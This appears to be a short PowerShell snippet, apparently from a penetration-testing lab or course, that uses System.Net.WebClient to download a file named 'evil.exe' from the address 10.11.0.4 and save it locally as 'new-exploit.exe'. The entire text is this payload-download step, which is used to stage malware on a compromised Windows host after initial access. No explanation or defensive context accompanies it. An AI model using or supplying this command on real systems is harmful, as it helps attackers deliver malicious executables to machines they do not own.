$webclient = New-Object System.Net.WebClient  
$url = "http://10.11.0.4/evil.exe"  
$file = "new-exploit.exe"  
$webclient.DownloadFile($url,$file)
